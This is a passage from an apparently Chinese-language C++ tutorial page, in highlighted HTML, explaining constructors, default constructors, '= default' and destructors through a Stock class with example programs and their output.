class="comment">// 构造函数声明 (两个版本)</span></span><br><span class="line">    Stock(); <span class="comment">// 默认构造函数 (无参数)</span></span><br><span class="line">    Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n = <span class="number">0</span>, <span class="keyword">double</span> pr = <span class="number">0.0</span>); <span class="comment">// 带参数的构造函数 (使用默认参数)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不再需要 acquire()，因为构造函数处理了初始设置</span></span><br><span class="line">    <span class="comment">// void acquire(const std::string &amp;co, long n, double pr);</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.cpp 中定义构造函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认构造函数定义</span></span><br><span class="line">Stock::Stock() &#123; <span class="comment">// 默认构造函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default constructor called\n&quot;</span>; <span class="comment">// 只是为了演示</span></span><br><span class="line">    company = <span class="string">&quot;no name&quot;</span>;</span><br><span class="line">    shares = <span class="number">0</span>;</span><br><span class="line">    share_val = <span class="number">0.0</span>;</span><br><span class="line">    total_val = <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参数的构造函数定义</span></span><br><span class="line">Stock::Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor using &quot;</span> &lt;&lt; co &lt;&lt; <span class="string">&quot; called\n&quot;</span>; <span class="comment">// 只是为了演示</span></span><br><span class="line">    company = co;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares can&#x27;t be negative; &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>;</span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... buy(), sell(), update(), show() 的定义保持不变 ...</span></span><br><span class="line"><span class="comment">// (注意：buy, sell, update 内部的 set_tot() 调用仍然需要)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-3-2-使用构造函数"><a href="#10-3-2-使用构造函数" class="headerlink" title="10.3.2 使用构造函数"></a>10.3.2 使用构造函数</h2><p>当创建对象时，编译器会自动选择匹配的构造函数来执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 包含 Stock 类定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用带参数的构造函数 Stock(const std::string &amp;co, long n, double pr)</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>)</span></span>; <span class="comment">// 显式提供所有参数</span></span><br><span class="line">    stock1.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用带参数的构造函数，利用了 n 和 pr 的默认值 (n=0, pr=0.0)</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Boffo Objects&quot;</span>)</span></span>; <span class="comment">// 等同于 Stock(&quot;Boffo Objects&quot;, 0, 0.0)</span></span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用默认构造函数 Stock()</span></span><br><span class="line">    Stock stock3; <span class="comment">// 注意：这里不能写 stock3()</span></span><br><span class="line">    stock3.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以使用 C++11 的列表初始化</span></span><br><span class="line">    Stock stock4 = &#123;<span class="string">&quot;Fleep Enterprises&quot;</span>, <span class="number">100</span>, <span class="number">1.25</span>&#125;; <span class="comment">// 调用带参数构造函数</span></span><br><span class="line">    stock4.show();</span><br><span class="line"></span><br><span class="line">    Stock stock5&#123;<span class="string">&quot;Dummy Corp&quot;</span>&#125;; <span class="comment">// 调用带参数构造函数 (利用默认值)</span></span><br><span class="line">    stock5.show();</span><br><span class="line"></span><br><span class="line">    Stock stock6&#123;&#125;; <span class="comment">// 调用默认构造函数 Stock()</span></span><br><span class="line">    stock6.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态分配对象时也会调用构造函数</span></span><br><span class="line">    Stock *p_stock = <span class="keyword">new</span> Stock(<span class="string">&quot;Electroshock Games&quot;</span>, <span class="number">18</span>, <span class="number">19.0</span>);</span><br><span class="line">    p_stock-&gt;show();</span><br><span class="line">    <span class="keyword">delete</span> p_stock; <span class="comment">// 稍后会看到 delete 会调用析构函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出可能包含 (取决于编译器和优化):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Constructor using NanoSmart called</span><br><span class="line">Company: NanoSmart  Shares: 12</span><br><span class="line">  Share Price: $20.000  Total Worth: $240.00</span><br><span class="line">Constructor using Boffo Objects called</span><br><span class="line">Company: Boffo Objects  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Default constructor called</span><br><span class="line">Company: no name  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Constructor using Fleep Enterprises called</span><br><span class="line">Company: Fleep Enterprises  Shares: 100</span><br><span class="line">  Share Price: $1.250  Total Worth: $125.00</span><br><span class="line">Constructor using Dummy Corp called</span><br><span class="line">Company: Dummy Corp  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Default constructor called</span><br><span class="line">Company: no name  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Constructor using Electroshock Games called</span><br><span class="line">Company: Electroshock Games  Shares: 18</span><br><span class="line">  Share Price: $19.000  Total Worth: $342.00</span><br></pre></td></tr></table></figure><h2 id="10-3-3-默认构造函数"><a href="#10-3-3-默认构造函数" class="headerlink" title="10.3.3 默认构造函数"></a>10.3.3 默认构造函数</h2><p><strong>默认构造函数 (Default Constructor)</strong> 是指<strong>不接受任何参数</strong>的构造函数。</p><ul><li>  <strong>编译器生成的默认构造函数:</strong> 如果你<strong>没有</strong>为类定义<strong>任何</strong>构造函数，编译器会自动为你生成一个默认构造函数。这个合成的构造函数什么也不做（对于内置类型成员不会初始化，对于类类型成员会调用其默认构造函数）。</li><li>  <strong>用户定义的默认构造函数:</strong> 如果你定义了一个无参数的构造函数（如上面 <code>Stock::Stock()</code>），那么它就是默认构造函数。</li><li>  <strong>重要规则:</strong> 如果你为类定义了<strong>任何</strong>构造函数（即使是带参数的），编译器就<strong>不会</strong>再自动生成默认构造函数了。如果你还需要一个无参数的构造函数（例如，为了能创建 <code>Stock stock3;</code> 这样的对象），你就必须<strong>显式地定义</strong>它。</li></ul><p>在我们的 <code>Stock</code> 示例中，因为我们定义了 <code>Stock(const std::string &amp;co, ...)</code>，编译器就不会自动生成默认构造函数。因此，我们必须自己提供 <code>Stock::Stock()</code>，否则 <code>Stock stock3;</code> 这样的声明将导致编译错误。</p><p><strong>C++11 <code>= default</code>:</strong> 如果你定义了其他构造函数，但仍希望编译器为你生成默认的、行为简单的默认构造函数，可以使用 <code>= default</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Example(<span class="keyword">int</span> v) : value(v) &#123;&#125; <span class="comment">// 用户定义的带参构造函数</span></span><br><span class="line">    Example() = <span class="keyword">default</span>; <span class="comment">// 显式要求编译器生成默认构造函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="10-3-4-析构函数"><a href="#10-3-4-析构函数" class="headerlink" title="10.3.4 析构函数"></a>10.3.4 析构函数</h2><p><strong>析构函数 (Destructor)</strong> 是另一种特殊的成员函数，它的主要目的是在对象<strong>生命周期结束</strong>时执行清理工作。</p><p><strong>用途:</strong></p><ul><li>  释放对象在生命周期内分配的资源（例如，通过 <code>new</code> 分配的内存）。</li><li>  执行任何必要的关闭操作（例如，关闭文件、断开网络连接）。</li></ul><p><strong>特点与规则:</strong></p><ol><li> <strong>名称:</strong> 析构函数的名称是在类名前加上波浪号 <code>~</code>（例如 <code>~Stock</code>）。</li><li> <strong>没有返回类型:</strong> 和构造函数一样，析构函数也没有返回类型，连 <code>void</code> 也没有。</li><li> <strong>没有参数:</strong> 析构函数不能接受任何参数，因此不能被重载。一个类最多只有一个析构函数。</li><li><strong>自动调用:</strong> 当对象被销毁时，析构函数会自动被调用。这发生在：<ul><li>  对象的<strong>作用域结束</strong>时（对于自动存储对象，如函数内的局部对象）。</li><li>  当对指向对象的指针调用 <code>delete</code> 时（对于动态存储对象）。</li><li>  当包含该对象的对象被销毁时。</li></ul></li></ol><p><strong>声明语法 (在类定义内):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... 构造函数和其他成员 ...</span></span><br><span class="line">    <span class="comment">// 析构函数声明</span></span><br><span class="line">    ~ClassName();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>定义语法 (在类外部):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassName::~ClassName() &#123;</span><br><span class="line">    <span class="comment">// 清理代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：为 <code>Stock</code> 类添加析构函数</strong></p><p>对于我们当前的 <code>Stock</code> 类，它并没有在内部使用 <code>new</code> 分配内存，所以析构函数不是严格必需的。但为了演示，我们可以添加一个简单的析构函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.h 的类定义中声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors ...</span></span><br><span class="line">    <span class="comment">// ... other public methods ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 析构函数声明</span></span><br><span class="line">    ~Stock();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.cpp 中定义析构函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... constructor definitions ...</span></span><br><span class="line"><span class="comment">// ... other method definitions ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 析构函数定义</span></span><br><span class="line">Stock::~Stock() &#123;</span><br><span class="line">    <span class="comment">// 对于这个简单的 Stock 类，没什么需要显式清理的</span></span><br><span class="line">    <span class="comment">// 但我们可以加一条打印语句来观察它何时被调用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye, &quot;</span> &lt;&lt; company &lt;&lt; <span class="string">&quot;!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>观察析构函数的调用:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123; <span class="comment">// 创建一个内部作用域</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Entering inner block ---\n&quot;</span>;</span><br><span class="line">        <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;Smart Comp&quot;</span>, <span class="number">50</span>, <span class="number">5.0</span>)</span></span>;</span><br><span class="line">        <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Great Gadgets&quot;</span>, <span class="number">10</span>, <span class="number">12.0</span>)</span></span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Exiting inner block ---\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 当离开这个作用域时，stock2 和 stock1 (按相反顺序创建) 会被销毁</span></span><br><span class="line">    &#125; <span class="comment">// stock2 的析构函数先调用，然后是 stock1 的</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Creating dynamic stock ---\n&quot;</span>;</span><br><span class="line">    Stock *p_stock = <span class="keyword">new</span> Stock(<span class="string">&quot;Dynamic Duo&quot;</span>, <span class="number">25</span>, <span class="number">2.5</span>);</span><br><span class="line">    p_stock-&gt;show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Deleting dynamic stock ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p_stock; <span class="comment">// 调用析构函数，然后释放内存</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- main() is ending ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>可能的输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--- Entering inner block ---</span><br><span class="line">Constructor using Smart Comp called</span><br><span class="line">Constructor using Great Gadgets called</span><br><span class="line">--- Exiting inner block ---</span><br><span class="line">Bye, Great Gadgets!</span><br><span class="line">Bye, Smart Comp!</span><br><span class="line">--- Creating dynamic stock ---</span><br><span class="line">Constructor using Dynamic Duo called</span><br><span class="line">Company: Dynamic Duo  Shares: 25</span><br><span class="line">  Share Price: $2.500  Total Worth: $62.50</span><br><span class="line">--- Deleting dynamic stock ---</span><br><span class="line">Bye, Dynamic Duo!</span><br><span class="line">--- main() is ending ---</span><br></pre></td></tr></table></figure><p>注意析构函数调用的时机和顺序（对于局部对象，与构造顺序相反）。</p><h2 id="10-3-5-改进-Stock-类"><a href="#10-3-5-改进-Stock-类" class="headerlink" title="10.3.5 改进 Stock 类"></a>10.3.5 改进 Stock 类</h2><p>现在，我们可以整合构造函数和析构函数，得到一个更完善（虽然在这个例子中析构函数作用不大）的 <code>Stock</code> 类。</p><p><strong>stock.h (最终版本)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\stock.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STOCK_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STOCK_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    Stock(); <span class="comment">// 默认构造函数</span></span><br><span class="line">    Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n = <span class="number">0</span>, <span class="keyword">double</span> pr = <span class="number">0.0</span>);</span><br><span class="line">    <span class="comment">// 析构函数</span></span><br><span class="line">    ~Stock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STOCK_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>stock.cpp (最终版本)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 